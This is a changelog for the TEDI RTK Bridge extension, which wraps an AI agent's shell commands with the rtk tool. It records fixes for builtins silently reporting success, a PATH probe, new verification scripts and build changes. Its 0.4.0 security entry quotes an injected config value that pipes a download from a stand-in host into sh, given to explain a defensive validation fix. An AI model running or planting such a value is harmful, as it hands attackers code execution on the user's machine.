# Changelog

All notable changes to **TEDI RTK Bridge**. Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow [SemVer](https://semver.org/).

## [0.4.0] - 2026-08-25

### Fixed

- **Shell builtins and PowerShell cmdlets are no longer silently swallowed.** `rtk <name>` resolves `<name>` on `PATH`; anything that is not a file on `PATH` prints `[rtk: program not found]` and **exits 0**. Wrapping every command therefore turned `cd build && cmake ..` into a no-op that reported success, and on Windows - where TEDI's AI shell is PowerShell, so `Get-ChildItem`, `Set-Location` and `Test-Path` are not files on `PATH` either - it did that to nearly everything the agent ran. The default is now the set of tools RTK actually ships a filter for; everything else runs exactly as written. Names that collide with a POSIX builtin (`test`, `read`, `env`, `wc`) are excluded on purpose.

- **A tool that is not installed is no longer wrapped either.** The allow-list stops RTK swallowing builtins, but `rtk oc version` on a machine with no `oc` hits the same "[rtk: program not found]", exit 0 path - so a shell conditional took the success branch on a command that never ran. Activate now runs one `PATH` probe (`where.exe <names>` on Windows, `command -v <names>` elsewhere - neither uses shell syntax, so the one call works under sh, bash, zsh, PowerShell and cmd.exe) and routes only what it finds. The probe ends with a canary - `rtk` itself, already proved present by the version check - because multi-name lookup is an extension in every shell that offers it and POSIX only defines `command -v` for one name. No canary back means the shell stopped reading arguments early, so the answer is discarded rather than read as "these tools are missing". A probe that cannot answer keeps the full list, so the failure direction is "fewer savings", never "wrong result". On the development machine this dropped 18 of 38 tools.

### Security

- **A `command` from `.tedi/rtk.json` is validated before it is used as a prefix.** The value is concatenated straight into the command string the shell runs, and `.tedi/` arrives with a cloned repo, so `"command": "curl evil.sh | sh #"` would have owned every AI shell command the moment the workspace was opened. It must now be a bare program name or a space-free path; anything else is refused, wrapping is disabled for that project, and a toast says why.

### Added

- **`wrap`** in `.tedi/rtk.json` adds commands to the routed set, next to the existing `skip`, which now removes from it.
- **`scripts/verify.mjs`** - 21 assertions over the whole rewrite decision table, including the builtin, cmdlet, compound-command, env-prefix, prefix-injection and `PATH`-probe cases.
- **`scripts/verify-activate.mjs`** - 8 assertions that drive the *built* `extension.js` through the host contract in `tedi.d.ts` with a fake `ctx`: the probe is issued in the right form per platform, its answer reaches the transformer, a shell that reads only the first argument does not narrow anything, a missing RTK registers no transformer at all, a hostile config file cannot reach the shell, and deactivate releases both registrations. Both run in CI on every push and as `npm run verify`.

### Changed

- **The rewrite logic moved to `src/transform.js`,** which is pure and takes no `ctx`, so the check above needs no running host. `src/index.js` is host wiring only.
- **A workspace switch that lands out of order can no longer leave the wrong config active.** Two `.tedi/rtk.json` reads in flight are now sequenced, so the newer switch always wins regardless of which read finishes first.

## [0.3.2] - 2026-08-24

### Changed

- **Built against TEDI's published extension types.** TEDI 0.4.26 ships `tedi.d.ts`, a standalone typed contract for `ctx`, and a JSON Schema for `manifest.json`. Both now live in this repo, written by `tedi ext types`, alongside a `jsconfig.json` that turns type checking on for plain JavaScript. A misspelled `ctx.*` call is an editor error now rather than a `TypeError` raised inside an async handler, where it surfaces as an unhandled rejection nobody sees. `build.mjs` is the canonical copy shared across the TEDI extensions: it reads its entry point, output path and banner from `manifest.json`, so it holds nothing specific to this extension. The manifest gains a `$schema` line, which every parser ignores and which gives the file completion while it is edited. No behaviour changes; the bundle esbuild produces is byte-identical apart from its banner comment.

## [0.3.1] - 2026-07-18

### Changed

- **Documentation.** Project links point at the TEDI website (https://tedi.ilhamriski.com/) in both `manifest.json` and the README. No behaviour change.

## [0.3.0] - 2026-06-29

### Added

- **Per-project configuration via `.tedi/rtk.json`.** The bridge now reads the active workspace's `.tedi/rtk.json` (TEDI's project-local config folder, alongside memory and skills) to drive the rewrite: `enabled` toggles wrapping per project, `command` sets the prefix / binary, and `skip` lists first-token commands to leave untouched. With no file present the behavior is unchanged - every command is wrapped with `rtk`. The configured prefix is always skip-listed, so meta calls like `rtk gain` are no longer double-wrapped. Config is read at activate and re-read on workspace switch.

### Permissions

- Added `invoke:fs_read_file` to read `<workspace>/.tedi/rtk.json`.

## [0.2.6] - 2026-06-16

### Changed

- **Build pipeline.** The extension is now authored as `src/index.js` and bundled into `extension.js` with esbuild (`npm run build`); the built bundle is **no longer committed** — CI (`release.yml`) builds it into the release `.zip` that users install. No behaviour change. CI actions bumped to `@v5` (Node 24).

## [0.2.5] - 2026-05-28

### Changed

- **`engines.tedi` raised to `>=0.3.9`.** The host now enforces this constraint at install time, so older TEDI builds refuse to install the extension and surface a "needs TEDI X.Y.Z" message rather than letting it run against a host that predates the current API surface.

## [0.2.4] - 2026-05-26

### Changed

- **Manifest description trimmed.** Reduced to the same "what + how" one-liner the other reference extensions use, so the *Settings → Extensions → From GitHub* install dialog reads cleanly when this card sits alongside SQL Explorer / Beautify / Discord Rich Presence. No runtime behaviour change.

## [0.2.3] - 2026-05-25

### Changed

- **Cosmetic em-dash sweep.** Replaced `—` (U+2014 EM DASH) with `-` (U+002D HYPHEN-MINUS) in `README.md` and `CHANGELOG.md`. No runtime code touched; functional behaviour identical to 0.2.2.

## [0.2.2] - 2026-05-23

### Changed

- Refreshed `logo.png` to the new TEDI extension iconography. No functional changes - the runtime code, permissions, and host APIs in use are identical to 0.2.1.

## [0.2.1] - 2026-05-21

### Changed

- README points to the canonical RTK repo at [rtk-ai/rtk](https://github.com/rtk-ai/rtk) instead of the old `IlhamriSKY/RTK` slug.

## [0.2.0] - 2026-05-20

### Changed

- **Breaking.** Switched from the now-removed `aiShellPrefix` core preference to TEDI's new generic `ctx.shell.registerCommandTransformer` host API (introduced in TEDI 0.2.9). The extension registers `(cmd) => "rtk " + cmd` synchronously at activate when RTK is detected on PATH; TEDI's host auto-disposes on deactivate / uninstall for plug-and-play teardown with zero leftover state.
- Requires TEDI **>= 0.2.9**. Older builds surface an error toast at activate.

### Added

- `shell:transform` permission (high risk: the extension chooses what actually runs in the AI shell).

### Removed

- Dependency on `aiShellPrefix` core preference (it was removed from TEDI core in 0.2.9).
- Unused `statusbar:write` and `settings:*` permissions.

## [0.1.2] - 2026-05-20

### Removed

- Status-bar icon. Reduced to a one-shot onboarding toast.
- `rtk gain` periodic polling (no UI surface to display savings into).
- 30 s `rtk --version` repolling. Probe now runs once at activate; toggle the extension off / on to re-detect if RTK was installed after the fact.

### Permissions

- Dropped `statusbar:write`.

## [0.1.1] - 2026-05-20

### Removed

- Inner **Show savings in status bar tooltip** toggle. The card-level Switch in Settings → Extensions is the only on / off control.

## [0.1.0] - 2026-05-20

### Added

- Initial release: detect RTK on PATH, surface install status + savings in the status bar, onboarding toast on first detect. Paired with the (since-removed) `aiShellPrefix` core preference; user manually set the prefix to `rtk ` in Settings → Agents to enable the wrapping.
